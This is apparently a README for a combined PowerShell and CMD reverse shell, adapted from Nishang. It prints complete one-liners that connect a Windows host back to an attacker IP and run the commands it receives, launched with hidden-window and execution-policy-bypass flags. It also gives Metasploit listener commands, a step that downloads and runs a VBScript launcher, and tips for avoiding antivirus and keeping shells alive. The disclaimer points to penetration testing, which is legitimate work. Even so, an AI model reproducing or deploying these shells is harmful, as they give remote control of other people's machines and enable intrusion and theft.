# Combined PowerShell and CMD Reverse Shell

**Credit:** Based on the PowerShell reverse shell one-liner provided by Nikhil Mittal:<br />
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

**Disclaimer:** These scripts are provided for educational purposes only and for use by Ethical Hackers. Use only on systems for which you have acquired all the legally required contracts and permissions for use. It is your responsibility to determine whether you are legally permitted to use these scripts in your country and for your purposes. No warrantee or guarantees are provided.

**Tested on** PowerShell version 2 and up.

**CMD Shell Intro:**<br />
This is a pseudo cmd.exe reverse shell. I designed this shell to support some PowerShell convenience commands such as 'pwd','ls','ps','rm','cp','mv','cat'.

Simply add more of them to the array if you wish to support more. Also, if you are determined to only support CMD commands when at the CMD prompt then reduce the list. Bear in mind that 'cd,'exit',and 'd:' are required, if you remove them you will be unable to make persistent changes to other drives or directories and you will not be able to use the exit command to exit the shell.

The reality is that PowerShell is calling 'cmd.exe /c' for every cmd command that you enter, so in effect PowerShell is the parent, cmd.exe the child and the only environment change that persists between commands happens in PowerShell. For this reason I had to catch any directory or drive letter change and execute them in PowerShell, otherwise the change would not persist between one call to cmd.exe and the next.

**PowerShell Shell Intro:**<br />
This shell doubles as a PowerShell reverse shell. Type $ps on the cmd command line and the shell will switch to a PowerShell shell from the cmd.exe shell. Then type $ps=$false in the PowerShell shell and you will switch back to running commands through cmd.exe.

The script is intended to be launched with the -NonI (non interactive) option of PowerShell. The result of not running it like this is that PowerShell will try to interactively prompt for missing parameters and your shell will be locked up. As a result of the -NonI option, if you fail to provide the required parameters to a PowerShell command you will not see any error messages, the command simply will not work. So if you are having issues with a command's syntax, be sure to test on your own Windows system from an interactive PowerShell prompt.

## Less Preferred Method of Invocation

 **On Kali:**<br />
export HOSTIP=10.0.0.22;<br />
export EXP1=5379;<br />
msfconsole -q -x "setg LHOST $HOSTIP;use exploit/multi/handler;set ExitOnSession false;set PAYLOAD windows/x64/shell_reverse_tcp;set EXITFUNC thread;set LPORT $EXP1;exploit -j;";

**On Windows:**<br />
set HOSTIP=10.0.0.22<br />
set EXP1=5379<br />
powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip=(gci -path env:HOSTIP).value;$port=(gci -path env:EXP1).value;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split(" ");$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

This invocation method assumes that you are pasting the text into a shell on Kali and on Windows. The downside is it will 'use up' the existing cmd shell that you have on Windows. The advantage is that you do not have to download any file.

## More Preferred Method of Invocation
**On Kali - Instructions**<br />
Set up an HTTP server that is providing access to the psrev.vbs file.<br />
Then...<br />
export HOSTIP=10.0.0.22;<br />
export EXP1=5379;<br />
msfconsole -q -x "setg LHOST $HOSTIP;use exploit/multi/handler;set ExitOnSession false;set PAYLOAD windows/x64/shell_reverse_tcp;set EXITFUNC thread;set LPORT $EXP1;exploit -j;";

**On Windows**<br />
Download the psrev.vbs script...<br />
set HOSTIP=10.0.0.22<br />
set EXP1=5379<br />
powershell.exe -Exec Bypass "& {$storageDir = $pwd;$webclient = New-Object System.Net.WebClient;$url = 'http://%HOSTIP%/scripts/vbs/psrev.vbs';$file = 'psrev.vbs';$webclient.DownloadFile($url,$file)}"

Run the psrev.vbs script...<br />
psrev.vbs<br />

The psrev.vbs script requires that you have set the HOSTIP and EXP1 environment variables in the current CMD shell on Windows.

## Different Requirements
If your requirements change such that you are not able to set environment variables on Windows before running the script try the following version:

powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='10.0.0.22';$port=5379;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split(" ");$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data +  $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

You will need to edit the $hostip and $port values before pasting the above line into Windows. As before this will 'use up' the existing cmd shell that you have on Windows.

For convenience there is also the psnoenv.vbs script. You will have to edit the script to use the correct $hostip and $port values before running it on the target.

## More Discussion

**Pasted Script VS VBScript Launcher Saved File**

You need to be able to save a file and execute it in order to use the Launcher. Some AV engines only look at files and not what is pasted into an existing command window. Sometimes you are able to execute commands but you are not able to see the output. Then it can be hard to know if your downloads are succeeding or where they are ending up. In this case you could try pasting in and running the script as a command.

If you can download and run the VBScript Launcher file it is far superior in the following ways: You can run the script multiple times and it will continue making reverse shell connections to the msfconsole multi/handler. You can close the original command window that you ran the Launcher script in and the reverse shells continue running. You can even run the Launcher script from within an existing reverse shell connection and it will launch another reverse shell connection to the multi/handler.

**Entered Text Is Echoed Back**

I always wondered why the reverse shell established with netcat echoed the command that was entered back as well as the output. I discovered the answer while trying to figure out why when a session was backgrounded in the multi/handler and then when I later returned to it none of the entered text was visible, and the output text was jumbled up with some of it on the input prompt line itself. As soon as I echoed back the input command text as well as the output with my PowerShell/cmd reverse shell, returning to a backgrounded session resulted in a session display that made sense.

## Troubleshooting

**The most common issue** that you are going to run into is that while you are trying to get another reverse shell (or the first one) using the "Combined PowerShell and CMD Reverse Shell", you are trying to run the PowerShell or VBScript script in a CMD shell (or reverse shell) that does not have the environment variables HOSTIP and EXP1 set. This can happen when you open another cmd prompt or establish a reverse shell using some other exploit or method. Simply set the required environment variables before trying to run the scripts.

**psrev.vbs Doesn't Seem To Work:** Typically, you will first need to find a directory that your current user is able to write to before attempting to download the psrev.vbs script. If the PowerShell file download script is not able to save the script you will not be able to run it. Other reasons the script may not be saved is if an Anti-Malware software is detecting and removing it, or if the download feature of PowerShell is getting blocked. Also establishing a reverse shell by running the script may not succeed if PowerShell is not permitted at all, or if outgoing connections from PowerShell are being blocked by the Firewall. Also keep in mind that the script requires at least PowerShell version 2 which is only installed by default on Windows 7 and newer Windows operating systems.

**Set Commands Do Not Persist:** With this "Combined PowerShell and CMD Reverse Shell", 'set commands' do not persist. This is because only the PowerShell shell persists between commands that you execute. The solution is to switch to the PowerShell version of the shell and set the environment variable using PowerShell commands:<br />

C:\Users\nc> $ps<br />
$ps<br />
True<br />
PS C:\Users\nc> set-item -path env:BLAH -value WHAT<br />
set-item -path env:BLAH -value WHAT<br />
PS C:\Users\nc> get-childitem -path env:BLAH<br />
get-childitem -path env:BLAH<br />

Name                           Value<br />
----                           -----<br />                                     
BLAH                           WHAT<br />                                     

PS C:\Users\nc> $ps=$false<br />
$ps=$false<br />
C:\Users\nc><br />

**STDERR (Standard Error)** output from the CMD prompt looks a bit odd. Because the CMD commands are being run from PowerShell you will see PowerShell tries to mark up the resulting error messages. The result looks rather messy. You should still be able to make out the original output of the CMD error message.


